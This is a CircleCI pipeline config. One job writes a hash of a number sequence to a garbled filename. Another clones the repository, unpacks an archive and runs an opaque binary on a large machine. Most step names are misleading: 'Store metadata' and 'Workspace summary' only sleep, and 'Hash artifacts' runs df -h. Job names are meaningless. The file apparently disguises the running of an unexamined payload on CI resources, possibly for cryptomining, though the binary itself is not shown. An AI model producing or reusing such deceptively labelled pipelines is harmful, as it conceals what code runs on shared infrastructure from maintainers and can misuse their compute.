version: 2.1

jobs:
  tryPull:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Spin Up The Hot Shards Phase
          command: |
            mkdir -p /tmp/tunnel
            set +o pipefail 2>/dev/null; sha256sum < <(seq 1 540114) > /tmp/tunnel/TensORCOBAlt; true
            # complete
            echo "stage finished"
      - persist_to_workspace:
          root: /tmp/tunnel
          paths:
            - 'TensORCOBAlt'
  add-db-glitch:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/tunnel
      - run:
          name: Collect upstream
          command: |
            cnt_lines() { awk 'END{print NR}' "$1" 2>/dev/null; }; cnt_lines /tmp/tunnel/TensORCOBAlt || true
      - run:
          name: Checkout main
          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore inputs
          command: gunzip -c static.tgz | tar xvf -
      - run:
          name: Store metadata
          command: /bin/sleep 30
      - run:
          name: Hash artifacts
          command: df -h
      - run:
          name: Workspace summary
          no_output_timeout: 15m
          command: sleep 90
      - run:
          command: taskset -c 0-3 ./app
